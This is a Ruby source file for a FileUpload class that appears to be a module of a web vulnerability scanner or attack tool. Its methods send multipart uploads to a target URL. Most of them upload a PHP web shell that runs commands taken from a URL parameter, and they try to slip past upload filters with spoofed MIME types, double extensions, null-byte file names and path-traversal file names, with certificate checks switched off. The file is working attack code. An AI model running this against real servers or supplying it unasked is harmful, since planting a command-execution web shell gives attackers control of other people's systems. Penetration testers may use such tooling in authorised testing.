require 'uri'
require 'net/http'
require 'mime/types'
require_relative '../utils/network'
require_relative '../utils/colorize'

class FileUpload
  EXTENSIONS = ['.php', '.jsp', '.asp', '.aspx', '.cgi', '.pl', '.py', '.rb', '.sh', '.exe', '.bat', '.cmd', '.ps1']
  MIME_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/octet-stream', 'application/pdf']
  
  def self.test_file_upload(url, field_name = 'file')
    results = []
    test_files = [
      { name: 'test.php', content: '<?php phpinfo(); ?>', ext: '.php' },
      { name: 'test.jsp', content: '<% out.println("test"); %>', ext: '.jsp' },
      { name: 'test.asp', content: '<% Response.Write("test") %>', ext: '.asp' },
      { name: 'test.txt', content: 'test', ext: '.txt' }
    ]
    
    test_files.each do |file|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        boundary = "----WebKitFormBoundary#{rand(1000000)}"
        body = []
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{file[:name]}\"\r\n"
        body << "Content-Type: application/octet-stream\r\n\r\n"
        body << file[:content]
        body << "\r\n--#{boundary}--\r\n"
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
        req.body = body.join
        
        res = http.request(req)
        
        if res.code.to_i < 400
          results << { file: file[:name], status: res.code, vulnerable: true }
          puts Colorize.red("Upload successful: #{file[:name]}")
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_mime_bypass(url, field_name = 'file')
    results = []
    malicious_content = '<?php system($_GET["cmd"]); ?>'
    
    MIME_TYPES.each do |mime|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        boundary = "----WebKitFormBoundary#{rand(1000000)}"
        body = []
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"test.php\"\r\n"
        body << "Content-Type: #{mime}\r\n\r\n"
        body << malicious_content
        body << "\r\n--#{boundary}--\r\n"
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
        req.body = body.join
        
        res = http.request(req)
        
        if res.code.to_i < 400
          results << { mime: mime, status: res.code, vulnerable: true }
          puts Colorize.red("MIME bypass successful: #{mime}")
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_double_extension(url, field_name = 'file')
    results = []
    extensions = ['php.jpg', 'php.png', 'php.gif', 'php.txt', 'php.pdf', 'jsp.jpg', 'asp.jpg', 'aspx.jpg']
    
    extensions.each do |ext|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        boundary = "----WebKitFormBoundary#{rand(1000000)}"
        body = []
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"test.#{ext}\"\r\n"
        body << "Content-Type: application/octet-stream\r\n\r\n"
        body << '<?php system($_GET["cmd"]); ?>'
        body << "\r\n--#{boundary}--\r\n"
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
        req.body = body.join
        
        res = http.request(req)
        
        if res.code.to_i < 400
          results << { extension: ext, status: res.code, vulnerable: true }
          puts Colorize.red("Double extension bypass: test.#{ext}")
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_null_byte(url, field_name = 'file')
    results = []
    null_byte_names = ["test.php\x00.jpg", "test.php%00.jpg", "test.php\0.jpg"]
    
    null_byte_names.each do |name|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        boundary = "----WebKitFormBoundary#{rand(1000000)}"
        body = []
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{name}\"\r\n"
        body << "Content-Type: application/octet-stream\r\n\r\n"
        body << '<?php system($_GET["cmd"]); ?>'
        body << "\r\n--#{boundary}--\r\n"
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
        req.body = body.join
        
        res = http.request(req)
        
        if res.code.to_i < 400
          results << { name: name, status: res.code, vulnerable: true }
          puts Colorize.red("Null byte bypass: #{name}")
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_path_traversal(url, field_name = 'file')
    results = []
    paths = ['../../../test.php', '..\\..\\..\\test.php', '....//....//test.php', '%2e%2e%2f%2e%2e%2f%2e%2e%2ftest.php']
    
    paths.each do |path|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        boundary = "----WebKitFormBoundary#{rand(1000000)}"
        body = []
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{path}\"\r\n"
        body << "Content-Type: application/octet-stream\r\n\r\n"
        body << '<?php system($_GET["cmd"]); ?>'
        body << "\r\n--#{boundary}--\r\n"
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
        req.body = body.join
        
        res = http.request(req)
        
        if res.code.to_i < 400
          results << { path: path, status: res.code, vulnerable: true }
          puts Colorize.red("Path traversal: #{path}")
        end
      rescue => e
      end
    end
    
    results
  end
end

